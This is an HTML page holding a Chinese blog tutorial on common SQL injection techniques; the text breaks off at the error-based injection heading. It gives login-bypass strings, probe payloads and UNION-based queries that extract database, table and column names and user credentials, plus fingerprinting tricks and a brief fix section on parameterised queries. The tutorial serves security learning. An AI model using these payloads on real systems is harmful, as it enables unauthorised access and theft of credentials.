<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>sql注入的常见姿势 | Fannnの挖掘小屋</title><meta name="author" content="Fannn"><meta name="copyright" content="Fannn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、SQL注入漏洞成因 当应用向后台发送数据时,没有经过严格过滤，将传入的数据当成了sql语句进行执行，导致了sql注入。 $sql&#x3D;&quot;select * from members where userid&#x3D;&quot;.$_GET[userid];$sb-&gt;query($sql);$sb-&gt;query(&quot;select * from members where use"><meta property="og:type" content="article"><meta property="og:title" content="sql注入的常见姿势"><meta property="og:url" content="https://www.fannn.xyz/2024/12/03/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/index.html"><meta property="og:site_name" content="Fannnの挖掘小屋"><meta property="og:description" content="一、SQL注入漏洞成因 当应用向后台发送数据时,没有经过严格过滤，将传入的数据当成了sql语句进行执行，导致了sql注入。 $sql&#x3D;&quot;select * from members where userid&#x3D;&quot;.$_GET[userid];$sb-&gt;query($sql);$sb-&gt;query(&quot;select * from members where use"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.fannn.xyz/img/avatar.jpg"><meta property="article:published_time" content="2024-12-03T11:17:56.000Z"><meta property="article:modified_time" content="2024-12-04T14:27:25.435Z"><meta property="article:author" content="Fannn"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.fannn.xyz/img/avatar.jpg"><link rel="shortcut icon" href="/img/bg.png"><link rel="canonical" href="https://www.fannn.xyz/2024/12/03/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:{internal_provider:"local",third_party_provider:"custom",version:!0,custom_format:"https://cdn.smartcis.cn/npm/${name}@${version}/${min_file}"},preload:!1,top_n_per_article:1,unescape:!1,languages:{hits_empty:"找不到您查询的内容：${query}",hits_stats:"共找到 ${hits} 篇文章"}},translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"簡"},noticeOutdate:void 0,highlight:{plugin:"highlight.js",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:300},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!0,post:!0},runtime:"天",dateSuffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:void 0,infinitegrid:{js:"https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js",buttonText:"加载更多"},isPhotoFigcaption:!1,islazyload:!0,isAnchor:!1,percent:{toc:!0,rightside:!0},autoDarkmode:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"sql注入的常见姿势",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-12-04 22:27:25"}</script><script>(e=>{e.saveToLocal={set:(e,t,a)=>{var o;0!==a&&(o=Date.now(),localStorage.setItem(e,JSON.stringify({value:t,expiry:o+864e5*a})))},get:e=>{var t=localStorage.getItem(e);if(t){t=JSON.parse(t);if(!(Date.now()>t.expiry))return t.value;localStorage.removeItem(e)}}},e.getScript=(o,c={})=>new Promise((t,e)=>{const a=document.createElement("script");a.src=o,a.async=!0,a.onerror=e,a.onload=a.onreadystatechange=function(){var e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,t())},Object.keys(c).forEach(e=>{a.setAttribute(e,c[e])}),document.head.appendChild(a)}),e.getCSS=(o,c=!1)=>new Promise((t,e)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=o,c&&(a.id=c),a.onerror=e,a.onload=a.onreadystatechange=function(){var e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,t())},document.head.appendChild(a)}),e.activateDarkMode=()=>{document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=()=>{document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};var e=saveToLocal.get("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches,a=window.matchMedia("(prefers-color-scheme: light)").matches,o=window.matchMedia("(prefers-color-scheme: no-preference)").matches,c=!t&&!a&&!o,t=(void 0===e?(a?activateLightMode():t?activateDarkMode():(o||c)&&((a=(new Date).getHours())<=6||18<=a?activateDarkMode:activateLightMode)(),window.matchMedia("(prefers-color-scheme: dark)").addListener(e=>{void 0===saveToLocal.get("theme")&&(e.matches?activateDarkMode:activateLightMode)()})):("light"===e?activateLightMode:activateDarkMode)(),saveToLocal.get("aside-status"));void 0!==t&&("hide"===t?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="D:\Blog\blog\themes\butterfly\source\css\background.css"><meta name="generator" content="Hexo 7.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.jpg" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/album/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(/img/default_top_img.jpg)"><nav id="nav"><span id="blog-info"><a href="/" title="Fannnの挖掘小屋"><span class="site-name">Fannnの挖掘小屋</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/album/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql注入的常见姿势</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2024-12-03T11:17:56.000Z" title="发表于 2024-12-03 19:17:56">2024-12-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">16.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>67分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="sql注入的常见姿势"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a><strong>一、SQL注入</strong></h3><p>漏洞成因</p><p>当应用向后台发送数据时,没有经过严格过滤，将传入的数据当成了sql语句进行执行，导致了sql注入。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from members where userid=&quot;</span>.<span class="variable">$_GET</span>[userid];</span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from members where userid=1 or 1=1&quot;</span>);</span><br></pre></td></tr></table></figure><p>账号密码都存在注入</p><p>正常后端语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;用户名&#x27;  and password=&#x27;密码&#x27;</span><br></pre></td></tr></table></figure><p>输入’&#x3D;’ 此时语句为如下,用户名 空等于空，密码空等于空，条件成立登录成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;&#x27;=&#x27;&#x27;  and password=&#x27;&#x27;=&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>正常的万能密码传入’or’1’&#x3D;’1 时语句如下，or是或，其中一个条件满足即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;&#x27;or&#x27;1&#x27;=&#x27;1&#x27;    and password=&#x27;&#x27;or&#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732455937693-5573bf0a-b288-4df2-8517-8b3a3aaba579.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p>正常的万能密码传入’or’1’&#x3D;’1 时语句如下，or是或，其中一个条件满足即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;&#x27;or&#x27;1&#x27;=&#x27;1&#x27;    and password=&#x27;&#x27;or&#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure><h3 id="二、账号存在注入"><a href="#二、账号存在注入" class="headerlink" title="二、账号存在注入"></a>二、账号存在注入</h3><p>后端语句,是根据用户名查询出密码，然后跟我们输入的密码进行比对</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;用户名&#x27;</span><br></pre></td></tr></table></figure><p>用户名单引号结果如下</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457477805-e4d8f4ce-548e-455b-a290-2edcf211072f.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p>知道列数的情况下可以利用联合注入来把返回的内容替换</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457660004-bc028995-adb3-4511-8948-16cee62acc8a.png?x-oss-process=image/format,webp" alt="image.png"></p><p>后端是md5加密那么，我们把密码部分替换成加密后的md5</p><p>此时查询出来的密码为md5了</p><p>1行(0.001秒)编辑,EXPLAIN,导出</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457832776-5e84a5be-968f-41e4-8470-5c6612f3645e.png?x-oss-process=image/format,webp" alt="image.png"></p><p>利用这个方法，我们传参为a，后端加密成 0cc175b9c0f1b6a831c399e269772661</p><p>此时数据库查询返回的密码为0cc175b9c0f1b6a831c399e269772661 我们传入的密码为a经过md5加密后也等于上面这个值所以登陆成功</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732458881438-a4c500bf-8902-404f-87de-68500a9dd5dd.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p>3.账号存在注入限制长度</p><p>后端语句,是根据用户名查询出密码，然后跟我们输入的密码进行比对,跟上一题一样唯一多的就是多了长度限制</p><p>用上一题payload显示长度过长</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459006414-1a8bfb5b-0b86-4ae7-a621-94de10e7d068.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p>mysql内部有md5等加密函数能够实现</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459237354-67f0c908-c358-434e-98bd-42875f58a640.png?x-oss-process=image/format,webp" alt="image.png"></p><p>成功登录，绕过长度限制</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459220307-84ca7676-b1e8-43d4-b9da-cda10380e8e9.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p>4.账号存在单引号过滤，可利用\转义</p><p>后端语句如下</p><p>select * from user1 where username&#x3D;’用户名’ and password&#x3D;’密码’</p><p>输入单引号会被后端替换成&#39;,输入的单引号会被当成 “数据”</p><p>select * from user1 where username&#x3D;’abc&#39;‘ and password&#x3D;’1312312’</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459565888-63b01666-116e-4a28-be4f-063d6b51962f.png?x-oss-process=image/format,webp" alt="image.png"></p><p>但是 账号跟密码都输入\的时候会把原来的单引号给转义 比如账号输入 abc\ 密码输入cba,很明显可以看到cba这部分是可以执行的部分而并非 “数据”</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459747355-01320d70-608e-4ae3-b2a8-9bf156230ff2.png?x-oss-process=image/format,webp" alt="image.png"></p><p>那么输入即可登陆成功</p><p>username&#x3D;&amp;password&#x3D;or+1&#x3D;1–+\</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459842491-1437f700-94a9-44ef-9661-3a476d2c8ccd.png?x-oss-process=image/format,webp" alt="image.png"></p><p>后端语句此时如下</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459898806-500edc6f-ffb4-40ec-b90b-8fb17c51b138.png?x-oss-process=image/format,webp" alt="image.png"></p><h3 id="三、其他"><a href="#三、其他" class="headerlink" title="三、其他"></a>三、其他</h3><p>3.1为什么payload注释后面会多奇奇怪怪的随机字符</p><p>经常能碰到payload如下这种情况注释后面跟着其他字符</p><p>mysql的注释–后面必须要跟着空白字符才生效</p><p>select * from user1 where username&#x3D;’A’ – 这是注释内容</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732456450137-fb168d92-9ace-478e-8d23-72fa7b842f72.png?x-oss-process=image/format,webp" alt="image.png"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732456496013-4ed4a1dc-9e38-4103-919b-1f360744124b.png?x-oss-process=image/format,webp" alt="image.png"></p><p>在开发中一般会去除接受到的参数的前后空白字符比如php的trim函数</p><p>PHPTRIM()函数从字符串的两端删除空白字符和其他预定义字符.</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732456705212-49669520-ee95-4bd4-a0ba-7ac77ba1ebec.png?x-oss-process=image/format,webp" alt="image.png"></p><p>所以在注释后面加上其他字符可以防止–+里面的+被去除也不影响注释</p><p>3.2快速判断数据库</p><p>当在用两个单引号判断注入的时候,两个单引号之间可以放内容</p><p>例如url如下</p><p><a target="_blank" rel="noopener" href="http://192.168.0.217/?id=1">http://192.168.0.217/?id=1</a>‘’</p><p>后端语句如下</p><p>select * from sqli_data where id&#x3D;’1’’’ order by id limit 1</p><p>在两个单引号之间输入%0b不会报错</p><p><a target="_blank" rel="noopener" href="http://192.168.0.217/?id=1%27%0B">http://192.168.0.217/?id=1&#39;%0B</a>‘</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457116646-9a84ae6c-16f9-496b-81b8-048ef429e4c9.png?x-oss-process=image/format,webp" alt="image.png"></p><p>通过不同数据库支持的字符不同即可得到数据库类型</p><p>mysql 支持 %0A %0b 等</p><p>Oracle 支持 %0A %00等</p><p>mssql 支持 %1F….等</p><p>利用&#x2F;**&#x2F;发现正常</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457209062-017f0645-7452-4978-8919-89b9ac19ab24.png?x-oss-process=image/format,webp" alt="image.png"></p><p>加上感叹号在加点内容后报错，判断为mysql,因为mysql支持内联注入</p><p>&#x2F;<em>!AAA</em>&#x2F;</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457258688-0d2d750f-baca-4bb8-beef-7e2614fd5d97.png?x-oss-process=image/format,webp" alt="image.png"></p><p>3.3 mysql注释字符</p><p>–空白字符 %09 %0b</p><p>#</p><p>‘;%00</p><p>sql注入的常见情况是</p><p>单引号和双引号引起状态码和报错信息的出现，比如200的页面，输入一个单引号变成500，两个则重新变成200</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>黑客是可以根据所能控制的内容在SQL语句的上下文导致不同的结果的，这种不同主要体现在不同的<code>数据库特性上和细节上</code>，因为很多的数据库在标准的SQL之外也会实现一些自身比较特别的功能和扩展，<code>常见的有Sqlserver的多语句查询，Mysql的高权限可以读写系统文件，Oracle经常出现的一些系统包提权漏洞。</code></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>比较传统的修复方式一般认为是对输入的数据进行有效的过滤，但是由于输入的来源太过广泛，可能来自于数据库，HTTP请求，文件或者其他的数据来源，较难对所有进入的数据在各种场景下进行有效的过滤。 事实上最罪恶的不是数据，而是我们使用数据的方式，最为彻底的修复一定要查找最为彻底的根源，我们可以看到最后的根源在于对数据和指令的不分离，所以在修复的时候应该极力将数据和指令分离。目前较为提倡的，同时在各种数据库操作框架里体现的方式就是以填充模板的方式来代替传统的拼接的方式进行数据库查询，譬如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$SqlTemplate</span>=<span class="string">&quot;select * from members where userid=&#123;userid|int&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">PreSql</span>(<span class="variable">$SqlTemplate</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>模板里有关数据及数据自身意义的描述，PreSql方法将实现将模板和数据安全的转换为SQL语句的功能，以保障最终的安全的实现</p><h1 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>我们篡改SQL语句很多时候都会使用到注释，SQL语法中的注释符有以下几种：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line">--+(这里的+其实是空格的意思，因为我们的注入时+通常会被识别为空格，这是早期养成的习惯，但是后来在看一些大牛的文章的时候会发现他们更爱用-- -这种形式，很多工具等等也是)</span><br><span class="line">/**/(这个也不太常用)</span><br></pre></td></tr></table></figure><h1 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h1><h2 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h2><p>MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种 <code>关联数据库管理系统</code> ，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p><p>一个完整的mysql管理系统结构通常如下图：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://raw.githubusercontent.com/chencicici/images/main/202206241358298.png" alt="img"></p><p>可以看到，mysql可以管理 <code>多个数据库</code> ，一个数据库可以包含 <code>多个数据表</code>，而一个数据表有含有 <code>多条字段</code> ，一行数据正是多个字段同一行的一串数据。</p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>很多时候联合查询也会和其他的几种查询方式一起使用。<br>联合查询用到的SQL语法知识</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION可以将前后两个查询语句的结果拼接到一起，但是会自动去重。</span><br><span class="line">UNION ALL功能相同，但是会显示所有数据，不会去重。</span><br></pre></td></tr></table></figure><p>具有类似功能的还有JOIN <a target="_blank" rel="noopener" href="https://blog.csdn.net/julielele/article/details/82023577">https://blog.csdn.net/julielele/article/details/82023577</a> 但是是一个对库表等进行连接的语句，我们在后续的绕过中会提到利用它来进行无列名注入。</p><ol><li><p>判断是否存在注入，注入是字符型还是数字型，闭合情况，绕过方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; </span><br><span class="line">?id=1&quot; </span><br><span class="line">?id=1&#x27;) </span><br><span class="line">?id=1&quot;) </span><br><span class="line">?id=1&#x27; or 1#</span><br><span class="line">?id=1&#x27; or 0#</span><br><span class="line">?id=1&#x27; or 1=1#</span><br><span class="line">?id=1&#x27; and 1=2#</span><br><span class="line">?id=1&#x27; and sleep(5)#</span><br><span class="line">?id=1&#x27; and 1=2 or &#x27; </span><br><span class="line">?id=1\</span><br></pre></td></tr></table></figure></li><li><p>猜测SQL查询语句中的字段数</p></li></ol><ul><li><p>使用 order&#x2F;group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">1&#x27; order by 2#</span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">1 order by 1</span><br><span class="line">1 order by 2</span><br><span class="line">1 order by 3</span><br><span class="line">​```   </span><br><span class="line"></span><br><span class="line">- 使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</span><br><span class="line">​```bash</span><br><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1 union select 1#</span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,2,3#</span><br></pre></td></tr></table></figure></li></ul><ol><li><p>确定显示数据的字段位置</p><p>使用 union select 1,2,3,4,… 根据回显的字段数，判断回显数据的字段位置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1#</span><br><span class="line">-1&#x27; union select 1,2#</span><br><span class="line">-1&#x27; union select 1,2,3#</span><br><span class="line">-1 union select 1#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,2,3#</span><br></pre></td></tr></table></figure></li></ol><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。</li><li>⼀定要拼接够足够的字段数，否则SQL语句报错。</li></ul><ol><li>在回显数据的字段位置使用 union select 将我们所需要的数据查询出来即可。包括但不限于：</li></ol><ul><li><p>获取当前数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库的表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取表中的字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+</span><br></pre></td></tr></table></figure><p>一般情况下就是这样的一个顺序，<code>确定联合查询的字段数-&gt;确定联合查询回显位置-&gt;爆库-&gt;爆表-&gt;爆字段-&gt;爆数据。</code></p></li></ul><p>我们可以看到这里使用了group_concat来拼接查询多个数据，在很多种查询中都有使用这个函数来提高效率，同时还可以拼接十六进制特殊字符来分隔，同时还使用了information_shcema表获取表信息、字段信息，这个表在低版本mysql中不存在，同时有时还会被过滤，这也会是我们绕过的一个方向。</p><p>在Mysql5.0以上的版本中加入了一个information_schema这个系统表，这个系统表中包含了该数据库的所有数据库名、表名、列表，可以通过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>来拿到用户的账号和口令，而Mysql5.0以下的只能暴力跑表名；5.0 以下是多用户单操作，5.0 以上是多用户多操作。</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" 